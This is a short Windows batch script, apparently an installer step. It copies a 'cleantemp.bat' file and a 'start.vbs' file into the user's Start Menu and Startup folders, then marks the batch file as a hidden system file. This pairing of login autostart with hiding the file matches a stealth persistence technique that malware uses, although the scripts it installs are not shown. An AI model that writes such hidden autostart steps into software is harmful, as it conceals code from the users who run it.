copy .\Engine\cleantemp.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"
copy .\Engine\start.vbs "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp\"
attrib +s +h "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\cleantemp.bat"